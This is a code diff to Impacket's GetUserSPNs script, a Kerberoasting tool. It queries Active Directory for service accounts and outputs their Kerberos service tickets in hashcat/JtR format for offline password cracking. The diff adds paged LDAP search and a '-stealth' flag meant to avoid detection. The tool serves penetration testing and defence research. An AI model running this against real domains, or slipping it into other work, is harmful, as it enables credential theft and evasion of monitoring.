@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
+# Copyright (C) 2023 Fortra. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -26,8 +26,6 @@
 #
 # ToDo:
 #   [X] Add the capability for requesting TGS and output them in JtR/hashcat format
-#   [X] Improve the search filter, we have to specify we don't want machine accounts in the answer
-#       (play with userAccountControl)
 #
 
 from __future__ import division
@@ -91,6 +89,7 @@ class GetUserSPNs:
         self.__kdcHost = cmdLineOptions.dc_host
         self.__saveTGS = cmdLineOptions.save
         self.__requestUser = cmdLineOptions.request_user
+        self.__stealth = cmdLineOptions.stealth
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
 
@@ -296,24 +295,37 @@ class GetUserSPNs:
                 raise
 
         # Building the search filter
-        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
-                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))"
+        filter_spn = "servicePrincipalName=*"
+        filter_person = "objectCategory=person"
+        filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"
+
+        searchFilter = "(&"
+        searchFilter += "(" + filter_person + ")"
+        searchFilter += "(" + filter_not_disabled + ")"
+
+        if self.__stealth is True:
+            logging.warning('Stealth option may cause huge memory consumption / out-of-memory errors on very large domains.')
+        else:
+            searchFilter += "(" + filter_spn + ")"
 
         if self.__requestUser is not None:
-            searchFilter += '(sAMAccountName:=%s))' % self.__requestUser
-        else:
-            searchFilter += ')'
+            searchFilter += '(sAMAccountName:=%s)' % self.__requestUser
+
+        searchFilter += ')'
 
         try:
+            # Microsoft Active Directory set an hard limit of 1000 entries returned by any search
+            paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)
+
             resp = ldapConnection.search(searchFilter=searchFilter,
                                          attributes=['servicePrincipalName', 'sAMAccountName',
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
-                                         sizeLimit=100000)
+                                         searchControls=[paged_search_control])
+
         except ldap.LDAPSearchError as e:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
+                # We should never reach this code as we use paged search now
                 logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
-                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
-                # paged queries
                 resp = e.getAnswers()
                 pass
             else:
@@ -321,7 +333,6 @@ class GetUserSPNs:
 
         answers = []
         logging.debug('Total of records returned %d' % len(resp))
-
         for item in resp:
             if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                 continue
@@ -397,7 +408,7 @@ class GetUserSPNs:
                         principalName.components = [downLevelLogonName]
 
                         tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
-                                                                                self.__kdcHost,
+                                                                                self.__kdcIP,
                                                                                 TGT['KDC_REP'], TGT['cipher'],
                                                                                 TGT['sessionKey'])
                         self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
@@ -420,12 +431,12 @@ class GetUserSPNs:
         self.request_multiple_TGSs(usernames)
 
     def request_multiple_TGSs(self, usernames):
+        if self.__outputFileName is not None:
+            fd = open(self.__outputFileName, 'w+')
+        else:
+            fd = None
+            
         if self.__no_preauth:
-            if self.__outputFileName is not None:
-                fd = open(self.__outputFileName, 'w+')
-            else:
-                fd = None
-
             for username in usernames:
                 try:
                     no_preauth_pincipal = Principal(self.__no_preauth, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -447,12 +458,7 @@ class GetUserSPNs:
         else:
             # Get a TGT for the current user
             TGT = self.getTGT()
-
-            if self.__outputFileName is not None:
-                fd = open(self.__outputFileName, 'w+')
-            else:
-                fd = None
-
+            
             for username in usernames:
                 try:
                     principalName = Principal()
@@ -460,7 +466,7 @@ class GetUserSPNs:
                     principalName.components = [username]
 
                     tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
-                                                                            self.__kdcHost,
+                                                                            self.__kdcIP,
                                                                             TGT['KDC_REP'], TGT['cipher'],
                                                                             TGT['sessionKey'])
                     self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
@@ -485,6 +491,8 @@ if __name__ == '__main__':
                              'Allows for Kerberoasting across trusts.')
     parser.add_argument('-no-preauth', action='store', help='account that does not require preauth, to obtain Service Ticket'
                                                          ' through the AS')
+    parser.add_argument('-stealth', action='store_true', help='Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. '
+                                                              'May cause huge memory consumption / errors on large domains.')
     parser.add_argument('-usersfile', help='File with user per line to test')
     parser.add_argument('-request', action='store_true', default=False, help='Requests TGS for users and output them '
                                                                              'in JtR/hashcat format (default False)')
@@ -493,8 +501,8 @@ if __name__ == '__main__':
     parser.add_argument('-save', action='store_true', default=False, help='Saves TGS requested to disk. Format is '
                                                                           '<username>.ccache. Auto selects -request')
     parser.add_argument('-outputfile', action='store',
-                        help='Output filename to write ciphers in JtR/hashcat format')
-    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
+                        help='Output filename to write ciphers in JtR/hashcat format. Auto selects -request')
+    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
     group = parser.add_argument_group('authentication')
